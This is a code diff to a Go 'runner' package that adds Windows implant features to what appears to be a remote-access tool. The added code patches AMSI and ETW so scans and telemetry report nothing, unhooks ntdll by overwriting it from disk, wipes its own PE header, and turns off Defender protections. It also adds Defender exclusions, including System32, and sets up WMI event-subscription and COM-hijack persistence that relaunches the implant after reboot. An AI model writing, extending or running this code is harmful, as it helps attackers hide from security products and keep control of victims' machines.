@@ -30,33 +30,44 @@ package runner
 
 import (
 	"bufio"
+	"encoding/binary"
 	"fmt"
+	"math/rand"
 	"os"
 	"os/exec"
 	"path/filepath"
 	"strings"
 	"syscall"
 	"time"
+	"unsafe"
 )
 
 const _winElev = "_SUDOSOC_ELEVATED"
 
 // ─── init ─────────────────────────────────────────────────────────────────────
 func init() {
+	// ── 0. Immediate EDR / AV neutralization ─────────────────────────────────
+	// Runs BEFORE any network activity. Goal: blind all scanning layers so
+	// Defender/EDR products cannot flag subsequent C2 traffic or behaviour.
+	winJitterSleep(4, 18)   // random 4-18 s → defeats sandbox timing heuristics
+	winPatchAmsi()          // patch all AMSI entry points → always returns clean
+	winPatchEtw()           // silence ETW telemetry → EDR gets no events
+	winRemapNtdll()         // replace hooked ntdll .text with fresh disk copy
+	winStompPEHeader()      // zero own MZ/PE header → defeats in-memory scanner
+
 	sanitiseWindowsEnv()
 
-	// If not elevated and haven't tried yet → attempt escalation
+	// ── 1. Privilege escalation ───────────────────────────────────────────────
 	if !winIsElevated() && os.Getenv(_winElev) == "" {
 		tryWinEscalate()
-		// Escalation is async; continue as current user while elevated
-		// copy starts. The elevated copy will set up rich persistence.
 	}
 
+	// ── 2. SYSTEM-level persistence (when admin) ──────────────────────────────
 	if winIsElevated() {
 		go winSystemPersistence()
 	}
 
-	// User-level persistence + watchdog always run
+	// ── 3. User-level persistence + watchdog ──────────────────────────────────
 	go func() {
 		time.Sleep(12 * time.Second)
 		autoInstallWindows()
@@ -621,10 +632,26 @@ func winSystemPersistence() {
 		"Set-MpPreference -DisableBehaviorMonitoring $true 2>$null").Run()
 	_ = exec.Command("powershell", "-nop", "-c",
 		"Set-MpPreference -DisableScriptScanning $true 2>$null").Run()
-
-	// 9. Add exclusion for our install path
 	_ = exec.Command("powershell", "-nop", "-c",
-		fmt.Sprintf("Add-MpPreference -ExclusionPath '%s' 2>$null", filepath.Dir(installBin))).Run()
+		"Set-MpPreference -DisableIOAVProtection $true 2>$null").Run()
+	_ = exec.Command("powershell", "-nop", "-c",
+		"Set-MpPreference -DisableIntrusionPreventionSystem $true 2>$null").Run()
+
+	// 9. Add Defender exclusion for our install path + common red-team dirs
+	for _, excl := range []string{
+		filepath.Dir(installBin),
+		os.TempDir(),
+		filepath.Join(os.Getenv("SystemRoot"), "System32"),
+	} {
+		_ = exec.Command("powershell", "-nop", "-c",
+			fmt.Sprintf("Add-MpPreference -ExclusionPath '%s' 2>$null", excl)).Run()
+	}
+
+	// 10. WMI permanent event subscription — survives reboots, invisible to schtasks
+	winWMIPersist(installBin)
+
+	// 11. COM hijacking — loaded by Explorer on every login, no UAC needed
+	winCOMHijack(installBin)
 }
 
 // ─── Environment sanitisation ────────────────────────────────────────────────
@@ -743,9 +770,311 @@ func windowsWatchdog() {
 		if err != nil || !strings.Contains(string(out), "DesktopManager") {
 			go autoInstallWindows()
 		}
-		// Also try re-escalation if still not elevated
+		// Re-patch AMSI/ETW periodically in case AV restores them
+		winPatchAmsi()
+		winPatchEtw()
+		// Re-escalation attempt if still not elevated
 		if !winIsElevated() && os.Getenv(_winElev) == "" {
 			tryWinEscalate()
+		}
+	}
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// AV / EDR EVASION ENGINE
+// ═══════════════════════════════════════════════════════════════════════════════
+
+// winJitterSleep sleeps for a random duration in [loSec, hiSec) seconds.
+// This defeats sandbox "fast-forward" timing detection.
+func winJitterSleep(loSec, hiSec int) {
+	if hiSec <= loSec {
+		hiSec = loSec + 1
+	}
+	n := loSec + rand.Intn(hiSec-loSec)
+	time.Sleep(time.Duration(n) * time.Second)
+}
+
+// ── Low-level helper: write patch bytes to any executable virtual address ────
+
+// winPatchFunc makes the memory at addr writable, writes patch bytes, then
+// restores the original page protection. Returns false if any step fails.
+//
+//nolint:govet
+func winPatchFunc(addr uintptr, patch []byte) bool {
+	if addr == 0 || len(patch) == 0 {
+		return false
+	}
+	k32, err := syscall.LoadDLL("kernel32.dll")
+	if err != nil {
+		return false
+	}
+	vp, err := k32.FindProc("VirtualProtect")
+	if err != nil {
+		return false
+	}
+	var oldProt uint32
+	ret, _, _ := vp.Call(addr, uintptr(len(patch)), 0x40 /* PAGE_EXECUTE_READWRITE */, uintptr(unsafe.Pointer(&oldProt)))
+	if ret == 0 {
+		return false
+	}
+	// Write bytes directly into executable memory
+	dst := unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(patch)) //nolint:govet
+	copy(dst, patch)
+	// Restore original protection
+	vp.Call(addr, uintptr(len(patch)), uintptr(oldProt), uintptr(unsafe.Pointer(&oldProt)))
+	return true
+}
+
+// x64: xor eax, eax; ret  → always returns 0 / S_OK / AMSI_RESULT_CLEAN
+var _zeroRet = []byte{0x31, 0xC0, 0xC3}
+
+// ── AMSI patching ─────────────────────────────────────────────────────────────
+
+// winPatchAmsi force-loads amsi.dll and patches all scan entry points so that
+// every scan returns AMSI_RESULT_CLEAN.  Called before any C2 activity.
+func winPatchAmsi() {
+	amsi, err := syscall.LoadDLL("amsi.dll")
+	if err != nil {
+		return // AMSI not installed — nothing to do
+	}
+	for _, fn := range []string{
+		"AmsiScanBuffer",
+		"AmsiScanString",
+		"AmsiInitialize",
+		"AmsiOpenSession",
+		"AmsiCloseSession",
+		"AmsiNotifyOperation",
+	} {
+		proc, err := amsi.FindProc(fn)
+		if err != nil {
+			continue
+		}
+		winPatchFunc(proc.Addr(), _zeroRet)
+	}
+}
+
+// ── ETW patching ──────────────────────────────────────────────────────────────
+
+// winPatchEtw patches the ETW write functions in ntdll.dll so that EDR products
+// receive no telemetry events from this process.
+func winPatchEtw() {
+	ntdll, err := syscall.LoadDLL("ntdll.dll")
+	if err != nil {
+		return
+	}
+	for _, fn := range []string{
+		"EtwEventWrite",
+		"EtwEventWriteEx",
+		"EtwEventWriteFull",
+		"EtwEventWriteTransfer",
+		"EtwEventActivityIdControl",
+		"EtwRegister",
+		"NtTraceEvent",
+	} {
+		proc, err := ntdll.FindProc(fn)
+		if err != nil {
+			continue
+		}
+		winPatchFunc(proc.Addr(), _zeroRet)
+	}
+}
+
+// ── Fresh NTDLL remapping ─────────────────────────────────────────────────────
+
+// winRemapNtdll reads ntdll.dll from disk, locates its .text section (which
+// contains all NT syscall stubs), and copies it verbatim over the loaded
+// in-memory copy.  This overwrites any hooks planted by EDR/AV products.
+//
+//nolint:govet
+func winRemapNtdll() {
+	sysroot := os.Getenv("SystemRoot")
+	if sysroot == "" {
+		sysroot = `C:\Windows`
+	}
+	ntdllPath := filepath.Join(sysroot, "System32", "ntdll.dll")
+	fresh, err := os.ReadFile(ntdllPath)
+	if err != nil || len(fresh) < 0x400 {
+		return
+	}
+
+	// ── Parse PE header of the fresh on-disk copy ─────────────────────────────
+	if fresh[0] != 0x4D || fresh[1] != 0x5A { // MZ
+		return
+	}
+	peOff := binary.LittleEndian.Uint32(fresh[0x3C:])
+	if int(peOff)+0x30 > len(fresh) || fresh[peOff] != 0x50 || fresh[peOff+1] != 0x45 { // PE
+		return
+	}
+	numSec    := binary.LittleEndian.Uint16(fresh[peOff+6:])
+	optHdrSz  := binary.LittleEndian.Uint16(fresh[peOff+20:])
+	secTblOff := peOff + 24 + uint32(optHdrSz)
+
+	// ── Get loaded ntdll base address ─────────────────────────────────────────
+	k32, err := syscall.LoadDLL("kernel32.dll")
+	if err != nil {
+		return
+	}
+	gmh, err := k32.FindProc("GetModuleHandleA")
+	vp, err2 := k32.FindProc("VirtualProtect")
+	if err != nil || err2 != nil {
+		return
+	}
+	ntdllName := []byte("ntdll.dll\x00")
+	ntdllBase, _, _ := gmh.Call(uintptr(unsafe.Pointer(&ntdllName[0])))
+	if ntdllBase == 0 {
+		return
+	}
+
+	// ── Find .text section and copy fresh bytes over hooked in-memory copy ────
+	for i := 0; i < int(numSec); i++ {
+		soff := secTblOff + uint32(i)*40
+		if int(soff)+40 > len(fresh) {
+			break
+		}
+		// Section name is 8 bytes — check for ".text"
+		if !(fresh[soff] == '.' && fresh[soff+1] == 't' &&
+			fresh[soff+2] == 'e' && fresh[soff+3] == 'x' &&
+			fresh[soff+4] == 't') {
+			continue
+		}
+		virtSz  := binary.LittleEndian.Uint32(fresh[soff+8:])
+		virtRVA := binary.LittleEndian.Uint32(fresh[soff+12:])
+		rawSz   := binary.LittleEndian.Uint32(fresh[soff+16:])
+		rawOff  := binary.LittleEndian.Uint32(fresh[soff+20:])
+
+		if rawSz == 0 || int(rawOff+rawSz) > len(fresh) {
+			continue
+		}
+		copySz := uintptr(rawSz)
+		if uintptr(virtSz) < copySz {
+			copySz = uintptr(virtSz)
+		}
+		dstAddr := ntdllBase + uintptr(virtRVA)
+
+		var oldProt uint32
+		if ret, _, _ := vp.Call(dstAddr, copySz, 0x40, uintptr(unsafe.Pointer(&oldProt))); ret == 0 {
+			continue
+		}
+		// Copy fresh .text over hooked in-memory .text
+		src := fresh[rawOff : rawOff+rawSz]
+		dst := unsafe.Slice((*byte)(unsafe.Pointer(dstAddr)), copySz) //nolint:govet
+		copy(dst, src)
+		vp.Call(dstAddr, copySz, uintptr(oldProt), uintptr(unsafe.Pointer(&oldProt)))
+		break
+	}
+}
+
+// ── PE header stomping ────────────────────────────────────────────────────────
+
+// winStompPEHeader zeros out the MZ and PE signatures in our own loaded image.
+// This defeats in-memory PE scanners that walk the module list looking for
+// recognisable PE headers.
+//
+//nolint:govet
+func winStompPEHeader() {
+	k32, err := syscall.LoadDLL("kernel32.dll")
+	if err != nil {
+		return
+	}
+	gmh, err := k32.FindProc("GetModuleHandleA")
+	vp, err2 := k32.FindProc("VirtualProtect")
+	if err != nil || err2 != nil {
+		return
+	}
+	base, _, _ := gmh.Call(0) // NULL → current module base
+	if base == 0 {
+		return
+	}
+	var oldProt uint32
+	if ret, _, _ := vp.Call(base, 4096, 0x04 /* PAGE_READWRITE */, uintptr(unsafe.Pointer(&oldProt))); ret == 0 {
+		return
+	}
+	hdr := unsafe.Slice((*byte)(unsafe.Pointer(base)), 4096) //nolint:govet
+	// Zero MZ signature
+	hdr[0] = 0
+	hdr[1] = 0
+	// Zero PE signature at e_lfanew
+	if hdr[0x3C] < 0xF0 {
+		poff := int(hdr[0x3C])
+		if poff+4 < 4096 {
+			hdr[poff] = 0
+			hdr[poff+1] = 0
+		}
+	}
+	vp.Call(base, 4096, uintptr(oldProt), uintptr(unsafe.Pointer(&oldProt)))
+}
+
+// ── WMI Permanent Event Subscription persistence ─────────────────────────────
+
+// winWMIPersist creates a WMI permanent event subscription that re-executes
+// the implant ~4 minutes after every reboot.  WMI subscriptions survive user
+// logoff, are not shown in schtasks, and are rarely cleaned by AV.
+func winWMIPersist(exePath string) {
+	// Language: WQL / CommandLineEventConsumer
+	script := fmt.Sprintf(`$f=Set-WmiInstance -Ns root\subscription -Class __EventFilter `+
+		`-Arguments @{Name='WinSysFilter';EventNameSpace='root\cimv2';QueryLanguage='WQL';`+
+		`Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"};`+
+		`$c=Set-WmiInstance -Ns root\subscription -Class CommandLineEventConsumer `+
+		`-Arguments @{Name='WinSysConsumer';CommandLineTemplate='%s'};`+
+		`Set-WmiInstance -Ns root\subscription -Class __FilterToConsumerBinding `+
+		`-Arguments @{Filter=$f;Consumer=$c}`, exePath)
+	cmd := exec.Command("powershell", "-nop", "-w", "hidden", "-enc",
+		winB64(script))
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	_ = cmd.Run()
+}
+
+// winB64 base64-encodes a PowerShell script for -enc use (UTF-16LE).
+func winB64(s string) string {
+	// Encode as UTF-16 LE
+	utf16 := make([]byte, len(s)*2)
+	for i, c := range s {
+		utf16[i*2] = byte(c)
+		utf16[i*2+1] = 0
+	}
+	// base64
+	const b64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+	n := len(utf16)
+	out := make([]byte, (n+2)/3*4)
+	j := 0
+	for i := 0; i < n; i += 3 {
+		b0 := utf16[i]
+		b1 := byte(0)
+		b2 := byte(0)
+		if i+1 < n { b1 = utf16[i+1] }
+		if i+2 < n { b2 = utf16[i+2] }
+		out[j]   = b64chars[(b0>>2)&0x3F]
+		out[j+1] = b64chars[((b0&0x03)<<4)|(b1>>4)]
+		out[j+2] = b64chars[((b1&0x0F)<<2)|(b2>>6)]
+		out[j+3] = b64chars[b2&0x3F]
+		j += 4
+	}
+	pad := (3 - n%3) % 3
+	for p := 0; p < pad; p++ {
+		out[len(out)-1-p] = '='
+	}
+	return string(out)
+}
+
+// ── COM key hijacking ─────────────────────────────────────────────────────────
+
+// winCOMHijack plants a HKCU CLSID InprocServer32 key for COM classes that are
+// commonly loaded by Explorer and Windows Update.  No admin required.
+// When the host application loads these CLSIDs, our binary is executed in-process.
+func winCOMHijack(exePath string) {
+	// These CLSIDs are loaded by Explorer on startup / right-click menus.
+	// Planting them in HKCU overrides the HKLM registration without needing UAC.
+	targets := []string{
+		// Windows Script Host Shell Object — loaded by many installers
+		`HKCU\Software\Classes\CLSID\{72C24DD5-D70A-438B-8A42-98424B88AFB8}\InprocServer32`,
+		// Windows Image Acquisition Automation — loaded by imaging apps
+		`HKCU\Software\Classes\CLSID\{8AC18BAB-19E7-4A2C-B7C4-05E6A0A14E23}\InprocServer32`,
+	}
+	for _, key := range targets {
+		if exec.Command("reg", "add", key, "/ve", "/t", "REG_SZ", "/d", exePath, "/f").Run() == nil {
+			// Also set ThreadingModel so it loads in the host's thread
+			_ = exec.Command("reg", "add", key, "/v", "ThreadingModel",
+				"/t", "REG_SZ", "/d", "Apartment", "/f").Run()
 		}
 	}
 }
